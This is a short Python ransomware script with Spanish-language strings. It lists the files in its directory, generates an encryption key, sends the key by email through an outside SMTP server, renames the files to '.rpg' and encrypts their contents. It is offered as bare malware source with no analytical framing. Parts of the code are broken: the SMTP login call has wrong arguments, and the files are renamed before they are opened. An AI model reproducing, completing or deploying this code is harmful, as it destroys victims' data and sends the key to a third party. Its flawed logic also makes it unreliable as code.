import os 
from cryptography.fernet import Fernet 
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

file_list = ["peakpx.jpg"]

excluded_files = ["Ransomware.py", "generatedkey.key"]

for file in os.listdir():
    if file not in excluded_files and os.path.isfile(file):
        file_list.append(file)
    
key = Fernet.generate_key()

key_text = key.decode("utf-8")

sender_mail = "MAIL"
sender_password = "PASSWORD"

def send_email(receiver_email, subject, message):
    try:
        msg = MIMEMultipart()
        msg["From"] = sender_mail
        msg["To"] = receiver_email
        msg["Subject"] = subject

        msg.attach(MIMEText(message, "plain","utf-8"))

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as email_server:
            email_server.starttls()
            email_server.login(send_email, receiver_email, msg.as_string())
        
        print("Correo electronico enviado exitosamente")
    except Exception as e:
        print(f"Error al enviar el correo electronico: {e}")

receiver_email = "pon un gmail"

subject = "Clave de encriptacion"

message = f"Aqui esta tu clave de encriptacion: {key_text}"

send_email(receiver_email, subject, message)

def change_file_extension(new_extension):
    for file in file_list:
        base_name, _ = os.path.splitext(file)
        new_filename = f"{base_name}.{new_extension}"
        try:
            os.rename(file, new_filename)
        except Exception as e:
            print(f"Error: {e}")

change_file_extension("rpg")

for file in file_list:
    with open(file,"rb") as the_file: 
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)
